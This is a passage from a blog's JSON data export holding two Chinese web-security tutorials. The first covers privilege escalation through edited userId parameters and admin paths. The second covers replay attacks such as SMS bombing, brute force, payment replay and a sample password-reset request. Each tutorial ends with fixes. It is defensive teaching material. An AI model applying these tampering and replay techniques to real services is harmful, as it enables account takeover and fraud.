调用功能前验证用户是否有权限调用相关功能","source":"_posts/越权访问.md","raw":"---\ntitle: 越权访问\ndate: 2019-12-06 09:45:46\ntag:\n\t- 越权访问\n---\n可访问/修改未授权内敏感信息；而造成这一隐患的主要原因就是权限控制不严，导致普通账户可访问/修改未授权敏感信息。下面根据两个示例来简单介绍下:\n\n## 越权分类\n\n#### 横向越权\n\n横向：是指用户可查看/修改同用户级别下的信息.\n\n位置：经常出现用户登后,查看个人信息或修改个人信息处通过修改user_id类的参数来实现横向越权.\n\n#### 纵向越权\n\n纵向：是指用户可查看/修改用户级别更高一级或管理员才具有的权限.\n\n位置：用户目录信息查看,可通过修改路径来获取更多敏感信息.\n\n以下将结合两个示例来具体介绍:\n\n### 漏洞位置\n\n1. 用户登陆后个人信息查看/修改处\n2. 用户登陆后输入其他路径或文件名获取敏感信息\n3. 等等\n\n### 实战\n\n#### 横向实战\n\n1.用户注册并登陆，并查看JS被是否包含一些tips\n\n![](/images/yq/zc.png)\n\n2.根据用户访问后的URL\n\n```php\nhttps://www.test.com.cn/user?loginUserId=&optType=1&userId=1\n```\n\n![](/images/yq/uid.png)\n\n3.修改userid获取其他账户信息\n\n```php+HTML\nhttps://www.test.com.cn/user?loginUserId=893&optType=1&userId=893\n```\n\n![](/images/yq/other_id.png)\n\n#### 纵向实战\n\n1.普通账户登陆，发现普通账户仅有部分权限\n\n![](/images/yq/login.png)\n\n2.查看JS\n\n![](/images/yq/js.png)\n\n3.修改URL,并访问\n\n```php+HTML\nhttps://www.test.com.cn/test/test1/administrator-list\n```\n\n![](/images/yq/administrator.png)\n\n### 加固建议\n\n1. 用户权限严格控制\n2. 执行关键操作前必须验证用户身份\n3. 直接对象引用的加密资源id,防止攻击者枚举ID\n4. 前后端同时校验\n5. 调用功能前验证用户是否有权限调用相关功能","slug":"越权访问","published":1,"updated":"2020-10-23T03:31:57.711Z","_id":"ckglobhe8000zb1hqf8nkfzhc","comments":1,"layout":"post","photos":[],"link":"","content":"<p>可访问/修改未授权内敏感信息；而造成这一隐患的主要原因就是权限控制不严，导致普通账户可访问/修改未授权敏感信息。下面根据两个示例来简单介绍下:</p>\n<h2 id=\"越权分类\"><a href=\"#越权分类\" class=\"headerlink\" title=\"越权分类\"></a>越权分类</h2><h4 id=\"横向越权\"><a href=\"#横向越权\" class=\"headerlink\" title=\"横向越权\"></a>横向越权</h4><p>横向：是指用户可查看/修改同用户级别下的信息.</p>\n<p>位置：经常出现用户登后,查看个人信息或修改个人信息处通过修改user_id类的参数来实现横向越权.</p>\n<h4 id=\"纵向越权\"><a href=\"#纵向越权\" class=\"headerlink\" title=\"纵向越权\"></a>纵向越权</h4><p>纵向：是指用户可查看/修改用户级别更高一级或管理员才具有的权限.</p>\n<p>位置：用户目录信息查看,可通过修改路径来获取更多敏感信息.</p>\n<p>以下将结合两个示例来具体介绍:</p>\n<h3 id=\"漏洞位置\"><a href=\"#漏洞位置\" class=\"headerlink\" title=\"漏洞位置\"></a>漏洞位置</h3><ol>\n<li>用户登陆后个人信息查看/修改处</li>\n<li>用户登陆后输入其他路径或文件名获取敏感信息</li>\n<li>等等</li>\n</ol>\n<h3 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h3><h4 id=\"横向实战\"><a href=\"#横向实战\" class=\"headerlink\" title=\"横向实战\"></a>横向实战</h4><p>1.用户注册并登陆，并查看JS被是否包含一些tips</p>\n<p><img src=\"/images/yq/zc.png\"></p>\n<p>2.根据用户访问后的URL</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.test.com.cn/user?loginUserId=&amp;optType=1&amp;userId=1</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/uid.png\"></p>\n<p>3.修改userid获取其他账户信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.test.com.cn&#x2F;user?loginUserId&#x3D;893&amp;optType&#x3D;1&amp;userId&#x3D;893</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/other_id.png\"></p>\n<h4 id=\"纵向实战\"><a href=\"#纵向实战\" class=\"headerlink\" title=\"纵向实战\"></a>纵向实战</h4><p>1.普通账户登陆，发现普通账户仅有部分权限</p>\n<p><img src=\"/images/yq/login.png\"></p>\n<p>2.查看JS</p>\n<p><img src=\"/images/yq/js.png\"></p>\n<p>3.修改URL,并访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.test.com.cn&#x2F;test&#x2F;test1&#x2F;administrator-list</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/administrator.png\"></p>\n<h3 id=\"加固建议\"><a href=\"#加固建议\" class=\"headerlink\" title=\"加固建议\"></a>加固建议</h3><ol>\n<li>用户权限严格控制</li>\n<li>执行关键操作前必须验证用户身份</li>\n<li>直接对象引用的加密资源id,防止攻击者枚举ID</li>\n<li>前后端同时校验</li>\n<li>调用功能前验证用户是否有权限调用相关功能</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>可访问/修改未授权内敏感信息；而造成这一隐患的主要原因就是权限控制不严，导致普通账户可访问/修改未授权敏感信息。下面根据两个示例来简单介绍下:</p>\n<h2 id=\"越权分类\"><a href=\"#越权分类\" class=\"headerlink\" title=\"越权分类\"></a>越权分类</h2><h4 id=\"横向越权\"><a href=\"#横向越权\" class=\"headerlink\" title=\"横向越权\"></a>横向越权</h4><p>横向：是指用户可查看/修改同用户级别下的信息.</p>\n<p>位置：经常出现用户登后,查看个人信息或修改个人信息处通过修改user_id类的参数来实现横向越权.</p>\n<h4 id=\"纵向越权\"><a href=\"#纵向越权\" class=\"headerlink\" title=\"纵向越权\"></a>纵向越权</h4><p>纵向：是指用户可查看/修改用户级别更高一级或管理员才具有的权限.</p>\n<p>位置：用户目录信息查看,可通过修改路径来获取更多敏感信息.</p>\n<p>以下将结合两个示例来具体介绍:</p>\n<h3 id=\"漏洞位置\"><a href=\"#漏洞位置\" class=\"headerlink\" title=\"漏洞位置\"></a>漏洞位置</h3><ol>\n<li>用户登陆后个人信息查看/修改处</li>\n<li>用户登陆后输入其他路径或文件名获取敏感信息</li>\n<li>等等</li>\n</ol>\n<h3 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h3><h4 id=\"横向实战\"><a href=\"#横向实战\" class=\"headerlink\" title=\"横向实战\"></a>横向实战</h4><p>1.用户注册并登陆，并查看JS被是否包含一些tips</p>\n<p><img src=\"/images/yq/zc.png\"></p>\n<p>2.根据用户访问后的URL</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.test.com.cn/user?loginUserId=&amp;optType=1&amp;userId=1</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/uid.png\"></p>\n<p>3.修改userid获取其他账户信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.test.com.cn&#x2F;user?loginUserId&#x3D;893&amp;optType&#x3D;1&amp;userId&#x3D;893</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/other_id.png\"></p>\n<h4 id=\"纵向实战\"><a href=\"#纵向实战\" class=\"headerlink\" title=\"纵向实战\"></a>纵向实战</h4><p>1.普通账户登陆，发现普通账户仅有部分权限</p>\n<p><img src=\"/images/yq/login.png\"></p>\n<p>2.查看JS</p>\n<p><img src=\"/images/yq/js.png\"></p>\n<p>3.修改URL,并访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.test.com.cn&#x2F;test&#x2F;test1&#x2F;administrator-list</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yq/administrator.png\"></p>\n<h3 id=\"加固建议\"><a href=\"#加固建议\" class=\"headerlink\" title=\"加固建议\"></a>加固建议</h3><ol>\n<li>用户权限严格控制</li>\n<li>执行关键操作前必须验证用户身份</li>\n<li>直接对象引用的加密资源id,防止攻击者枚举ID</li>\n<li>前后端同时校验</li>\n<li>调用功能前验证用户是否有权限调用相关功能</li>\n</ol>\n"},{"title":"重放攻击","date":"2020-10-14T08:57:27.000Z","_content":"\n重放攻击(Replay Attacks)属于业务逻辑类漏洞范围内，因用户(攻击者)对目标系统请求过程中进行拦截/截获数据包，并修改其中参数或部分信息进行重放而造成的漏洞。\n\n#### 漏洞概述\n\n重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。\n\n重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。\n\n#### 漏洞原理\n\n由于服务器端未对用户每次提交数据进行及时认证或销毁，导致攻击者截获数据包后再重新发送恶意数据而造成攻击。\n\n#### 漏洞危害\n\n重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。\n\n重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。\n\n#### 漏洞分类\n\n##### 1.短信轰炸\n\n短线轰炸是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。\n\n例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。\n\n![15823511987787](/images/replay&attack/15823511987787.jpg)\n\n##### 2.暴力破解\n\n暴力破解属于重放攻击，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。\n\n###### 2.1.密码爆破\n\n当用户登陆时，缺少验证码或者验证码复用，并且账号没有错误的次数限制。可通过暴力破解碰撞密码来登录。\n\n![5C3068EC-B7BF-4B02-A7E4-792BA0F85C31](/images/replay&attack/5C3068EC-B7BF-4B02-A7E4-792BA0F85C31.png)\n\n###### 2.2.用户名爆破\n\n系统登陆处开发人员对用户名或密码输入错误未进行报错提示规范处理，导致输入错误账户提示用户名不存在等字符，可能导致攻击者进行用户名遍历并收集成字典后再根据收集到的用户名进行口令爆破行为。\n\n![05A29BBA-E3DD-4C09-A69D-F9CA72EB6822](/images/replay&attack/05A29BBA-E3DD-4C09-A69D-F9CA72EB6822.png)\n\n###### 2.3.验证码爆破\n\n短信验证码常被用于网站用户注册、安全登录以及忘记密码、修改绑定手机号码等应用场景，特别是一些涉及到用户个人敏感行为时候，为了确认操作是用户本人执行的通常会使用短信验证码进行二次认证。那么很多网站的短信验证码接口都会或多或少的存在一些逻辑漏洞。\n\n![3EB24068-0BC1-49E7-B634-2FC1F5D06AA8](/images/replay&attack/3EB24068-0BC1-49E7-B634-2FC1F5D06AA8.png)\n\n###### 2.4.参数爆破\n\n此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数。\n\n##### 3.支付重放\n\n支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。\n\n\n\n##### 4.密码修改\n\n可以参考CSRF漏洞。\n\n如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。\n\n当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。\n\n```shell\nPOST /userpwd?p=2 HTTP/1.1\nHost: xxx.com\n\nphone=1111111111&code=123456&pwd=123456&newpwd=123456\n```\n\n##### 5.条件竞争\n\n条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。\n\n这类漏洞一般测试方式直接高并发进行检测即可；JMeter\n\n#### 漏洞修复\n\n1. 添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。\n2. 限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。\n3. 效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。\n\n","source":"_posts/重放攻击.md","raw":"---\ntitle: 重放攻击\ndate: 2020-10-14 16:57:27\ntags:\n - Web\n---\n\n重放攻击(Replay Attacks)属于业务逻辑类漏洞范围内，因用户(攻击者)对目标系统请求过程中进行拦截/截获数据包，并修改其中参数或部分信息进行重放而造成的漏洞。\n\n#### 漏洞概述\n\n重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。\n\n重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。\n\n#### 漏洞原理\n\n由于服务器端未对用户每次提交数据进行及时认证或销毁，导致攻击者截获数据包后再重新发送恶意数据而造成攻击。\n\n#### 漏洞危害\n\n重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。\n\n重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。\n\n#### 漏洞分类\n\n##### 1.短信轰炸\n\n短线轰炸是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。\n\n例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。\n\n![15823511987787](/images/replay&attack/15823511987787.jpg)\n\n##### 2.暴力破解\n\n暴力破解属于重放攻击，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。\n\n###### 2.1.密码爆破\n\n当用户登陆时，缺少验证码或者验证码复用，并且账号没有错误的次数限制。可通过暴力破解碰撞密码来登录。\n\n![5C3068EC-B7BF-4B02-A7E4-792BA0F85C31](/images/replay&attack/5C3068EC-B7BF-4B02-A7E4-792BA0F85C31.png)\n\n###### 2.2.用户名爆破\n\n系统登陆处开发人员对用户名或密码输入错误未进行报错提示规范处理，导致输入错误账户提示用户名不存在等字符，可能导致攻击者进行用户名遍历并收集成字典后再根据收集到的用户名进行口令爆破行为。\n\n![05A29BBA-E3DD-4C09-A69D-F9CA72EB6822](/images/replay&attack/05A29BBA-E3DD-4C09-A69D-F9CA72EB6822.png)\n\n###### 2.3.验证码爆破\n\n短信验证码常被用于网站用户注册、安全登录以及忘记密码、修改绑定手机号码等应用场景，特别是一些涉及到用户个人敏感行为时候，为了确认操作是用户本人执行的通常会使用短信验证码进行二次认证。那么很多网站的短信验证码接口都会或多或少的存在一些逻辑漏洞。\n\n![3EB24068-0BC1-49E7-B634-2FC1F5D06AA8](/images/replay&attack/3EB24068-0BC1-49E7-B634-2FC1F5D06AA8.png)\n\n###### 2.4.参数爆破\n\n此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数。\n\n##### 3.支付重放\n\n支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。\n\n\n\n##### 4.密码修改\n\n可以参考CSRF漏洞。\n\n如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。\n\n当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。\n\n```shell\nPOST /userpwd?p=2 HTTP/1.1\nHost: xxx.com\n\nphone=1111111111&code=123456&pwd=123456&newpwd=123456\n```\n\n##### 5.条件竞争\n\n条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。\n\n这类漏洞一般测试方式直接高并发进行检测即可；JMeter\n\n#### 漏洞修复\n\n1. 添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。\n2. 限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。\n3. 效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。\n\n","slug":"重放攻击","published":1,"updated":"2020-10-23T03:17:53.936Z","_id":"ckglobhe90010b1hq8nll0c6u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>重放攻击(Replay Attacks)属于业务逻辑类漏洞范围内，因用户(攻击者)对目标系统请求过程中进行拦截/截获数据包，并修改其中参数或部分信息进行重放而造成的漏洞。</p>\n<h4 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h4><p>重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。</p>\n<p>重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p>\n<h4 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><p>由于服务器端未对用户每次提交数据进行及时认证或销毁，导致攻击者截获数据包后再重新发送恶意数据而造成攻击。</p>\n<h4 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h4><p>重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。</p>\n<p>重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。</p>\n<h4 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h4><h5 id=\"1-短信轰炸\"><a href=\"#1-短信轰炸\" class=\"headerlink\" title=\"1.短信轰炸\"></a>1.短信轰炸</h5><p>短线轰炸是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。</p>\n<p>例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。</p>\n<p><img src=\"/images/replay&attack/15823511987787.jpg\" alt=\"15823511987787\"></p>\n<h5 id=\"2-暴力破解\"><a href=\"#2-暴力破解\" class=\"headerlink\" title=\"2.暴力破解\"></a>2.暴力破解</h5><p>暴力破解属于重放攻击，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。</p>\n<h6 id=\"2-1-密码爆破\"><a href=\"#2-1-密码爆破\" class=\"headerlink\" title=\"2.1.密码爆破\"></a>2.1.密码爆破</h6><p>当用户登陆时，缺少验证码或者验证码复用，并且账号没有错误的次数限制。可通过暴力破解碰撞密码来登录。</p>\n<p><img src=\"/images/replay&attack/5C3068EC-B7BF-4B02-A7E4-792BA0F85C31.png\" alt=\"5C3068EC-B7BF-4B02-A7E4-792BA0F85C31\"></p>\n<h6 id=\"2-2-用户名爆破\"><a href=\"#2-2-用户名爆破\" class=\"headerlink\" title=\"2.2.用户名爆破\"></a>2.2.用户名爆破</h6><p>系统登陆处开发人员对用户名或密码输入错误未进行报错提示规范处理，导致输入错误账户提示用户名不存在等字符，可能导致攻击者进行用户名遍历并收集成字典后再根据收集到的用户名进行口令爆破行为。</p>\n<p><img src=\"/images/replay&attack/05A29BBA-E3DD-4C09-A69D-F9CA72EB6822.png\" alt=\"05A29BBA-E3DD-4C09-A69D-F9CA72EB6822\"></p>\n<h6 id=\"2-3-验证码爆破\"><a href=\"#2-3-验证码爆破\" class=\"headerlink\" title=\"2.3.验证码爆破\"></a>2.3.验证码爆破</h6><p>短信验证码常被用于网站用户注册、安全登录以及忘记密码、修改绑定手机号码等应用场景，特别是一些涉及到用户个人敏感行为时候，为了确认操作是用户本人执行的通常会使用短信验证码进行二次认证。那么很多网站的短信验证码接口都会或多或少的存在一些逻辑漏洞。</p>\n<p><img src=\"/images/replay&attack/3EB24068-0BC1-49E7-B634-2FC1F5D06AA8.png\" alt=\"3EB24068-0BC1-49E7-B634-2FC1F5D06AA8\"></p>\n<h6 id=\"2-4-参数爆破\"><a href=\"#2-4-参数爆破\" class=\"headerlink\" title=\"2.4.参数爆破\"></a>2.4.参数爆破</h6><p>此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数。</p>\n<h5 id=\"3-支付重放\"><a href=\"#3-支付重放\" class=\"headerlink\" title=\"3.支付重放\"></a>3.支付重放</h5><p>支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。</p>\n<h5 id=\"4-密码修改\"><a href=\"#4-密码修改\" class=\"headerlink\" title=\"4.密码修改\"></a>4.密码修改</h5><p>可以参考CSRF漏洞。</p>\n<p>如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。</p>\n<p>当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /userpwd?p=2 HTTP/1.1</span><br><span class=\"line\">Host: xxx.com</span><br><span class=\"line\"></span><br><span class=\"line\">phone=1111111111&amp;code=123456&amp;pwd=123456&amp;newpwd=123456</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-条件竞争\"><a href=\"#5-条件竞争\" class=\"headerlink\" title=\"5.条件竞争\"></a>5.条件竞争</h5><p>条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。</p>\n<p>这类漏洞一般测试方式直接高并发进行检测即可；JMeter</p>\n<h4 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h4><ol>\n<li>添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。</li>\n<li>限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。</li>\n<li>效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>重放攻击(Replay Attacks)属于业务逻辑类漏洞范围内，因用户(攻击者)对目标系统请求过程中进行拦截/截获数据包，并修改其中参数或部分信息进行重放而造成的漏洞。</p>\n<h4 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h4><p>重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。</p>\n<p>重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p>\n<h4 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h4><p>由于服务器端未对用户每次提交数据进行及时认证或销毁，导致攻击者截获数据包后再重新发送恶意数据而造成攻击。</p>\n<h4 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h4><p>重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。</p>\n<p>重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。</p>\n<h4 id=\"漏洞分类\"><a href=\"#漏洞分类\" class=\"headerlink\" title=\"漏洞分类\"></a>漏洞分类</h4><h5 id=\"1-短信轰炸\"><a href=\"#1-短信轰炸\" class=\"headerlink\" title=\"1.短信轰炸\"></a>1.短信轰炸</h5><p>短线轰炸是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。</p>\n<p>例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。</p>\n<p><img src=\"/images/replay&attack/15823511987787.jpg\" alt=\"15823511987787\"></p>\n<h5 id=\"2-暴力破解\"><a href=\"#2-暴力破解\" class=\"headerlink\" title=\"2.暴力破解\"></a>2.暴力破解</h5><p>暴力破解属于重放攻击，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。</p>\n<h6 id=\"2-1-密码爆破\"><a href=\"#2-1-密码爆破\" class=\"headerlink\" title=\"2.1.密码爆破\"></a>2.1.密码爆破</h6><p>当用户登陆时，缺少验证码或者验证码复用，并且账号没有错误的次数限制。可通过暴力破解碰撞密码来登录。</p>\n<p><img src=\"/images/replay&attack/5C3068EC-B7BF-4B02-A7E4-792BA0F85C31.png\" alt=\"5C3068EC-B7BF-4B02-A7E4-792BA0F85C31\"></p>\n<h6 id=\"2-2-用户名爆破\"><a href=\"#2-2-用户名爆破\" class=\"headerlink\" title=\"2.2.用户名爆破\"></a>2.2.用户名爆破</h6><p>系统登陆处开发人员对用户名或密码输入错误未进行报错提示规范处理，导致输入错误账户提示用户名不存在等字符，可能导致攻击者进行用户名遍历并收集成字典后再根据收集到的用户名进行口令爆破行为。</p>\n<p><img src=\"/images/replay&attack/05A29BBA-E3DD-4C09-A69D-F9CA72EB6822.png\" alt=\"05A29BBA-E3DD-4C09-A69D-F9CA72EB6822\"></p>\n<h6 id=\"2-3-验证码爆破\"><a href=\"#2-3-验证码爆破\" class=\"headerlink\" title=\"2.3.验证码爆破\"></a>2.3.验证码爆破</h6><p>短信验证码常被用于网站用户注册、安全登录以及忘记密码、修改绑定手机号码等应用场景，特别是一些涉及到用户个人敏感行为时候，为了确认操作是用户本人执行的通常会使用短信验证码进行二次认证。那么很多网站的短信验证码接口都会或多或少的存在一些逻辑漏洞。</p>\n<p><img src=\"/images/replay&attack/3EB24068-0BC1-49E7-B634-2FC1F5D06AA8.png\" alt=\"3EB24068-0BC1-49E7-B634-2FC1F5D06AA8\"></p>\n<h6 id=\"2-4-参数爆破\"><a href=\"#2-4-参数爆破\" class=\"headerlink\" title=\"2.4.参数爆破\"></a>2.4.参数爆破</h6><p>此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数。</p>\n<h5 id=\"3-支付重放\"><a href=\"#3-支付重放\" class=\"headerlink\" title=\"3.支付重放\"></a>3.支付重放</h5><p>支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。</p>\n<h5 id=\"4-密码修改\"><a href=\"#4-密码修改\" class=\"headerlink\" 